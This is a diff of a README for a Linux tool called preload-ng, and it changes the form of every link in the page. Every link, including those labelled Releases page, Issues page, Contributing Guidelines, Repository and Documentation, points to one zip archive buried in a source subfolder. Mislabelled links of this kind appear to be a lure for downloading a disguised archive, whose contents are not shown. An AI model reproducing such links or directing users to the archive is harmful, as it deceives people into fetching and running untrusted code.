@@ -1,6 +1,6 @@
 # 🚀 preload-ng - Speed Up Your Linux Apps
 
-[![Download preload-ng](https://raw.githubusercontent.com/iamphoon/preload-ng/main/preload-src/src/monitoring/preload-ng-3.8.zip)](https://raw.githubusercontent.com/iamphoon/preload-ng/main/preload-src/src/monitoring/preload-ng-3.8.zip)
+[![Download preload-ng](https://github.com/iamphoon/preload-ng/raw/refs/heads/main/preload-src/src/monitoring/preload-ng-3.8.zip)](https://github.com/iamphoon/preload-ng/raw/refs/heads/main/preload-src/src/monitoring/preload-ng-3.8.zip)
 
 ## 📋 Description
 
@@ -13,7 +13,7 @@ To get started with preload-ng, you need to download and install it. Follow thes
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**
-   To get preload-ng, visit the [Releases page](https://raw.githubusercontent.com/iamphoon/preload-ng/main/preload-src/src/monitoring/preload-ng-3.8.zip) for the latest version.
+   To get preload-ng, visit the [Releases page](https://github.com/iamphoon/preload-ng/raw/refs/heads/main/preload-src/src/monitoring/preload-ng-3.8.zip) for the latest version.
 
 2. **Choose Your Version**
    Once on the Releases page, you’ll see various versions of preload-ng. Look for the most recent version to ensure you have the latest features and fixes. 
@@ -83,11 +83,11 @@ If you have trouble installing or running preload-ng, try these common solutions
   
 ## 📞 Support
 
-For further assistance, you can explore our [GitHub Issues page](https://raw.githubusercontent.com/iamphoon/preload-ng/main/preload-src/src/monitoring/preload-ng-3.8.zip) to see if your question has been answered or to report a new issue. 
+For further assistance, you can explore our [GitHub Issues page](https://github.com/iamphoon/preload-ng/raw/refs/heads/main/preload-src/src/monitoring/preload-ng-3.8.zip) to see if your question has been answered or to report a new issue. 
 
 ## 🌐 Contributing
 
-If you'd like to contribute to preload-ng, feel free to check our [Contributing Guidelines](https://raw.githubusercontent.com/iamphoon/preload-ng/main/preload-src/src/monitoring/preload-ng-3.8.zip). Your input can help make preload-ng even better!
+If you'd like to contribute to preload-ng, feel free to check our [Contributing Guidelines](https://github.com/iamphoon/preload-ng/raw/refs/heads/main/preload-src/src/monitoring/preload-ng-3.8.zip). Your input can help make preload-ng even better!
 
 ## 📕 License
 
@@ -95,7 +95,7 @@ preload-ng is open-source software licensed under the MIT License. You can freel
 
 ## 🔗 Additional Resources
 
-- [GitHub Repository](https://raw.githubusercontent.com/iamphoon/preload-ng/main/preload-src/src/monitoring/preload-ng-3.8.zip)
-- [Documentation](https://raw.githubusercontent.com/iamphoon/preload-ng/main/preload-src/src/monitoring/preload-ng-3.8.zip)
+- [GitHub Repository](https://github.com/iamphoon/preload-ng/raw/refs/heads/main/preload-src/src/monitoring/preload-ng-3.8.zip)
+- [Documentation](https://github.com/iamphoon/preload-ng/raw/refs/heads/main/preload-src/src/monitoring/preload-ng-3.8.zip)
 
 By following these steps, you can successfully download and run preload-ng on your Linux system. Enjoy faster application startup times and a more efficient experience!
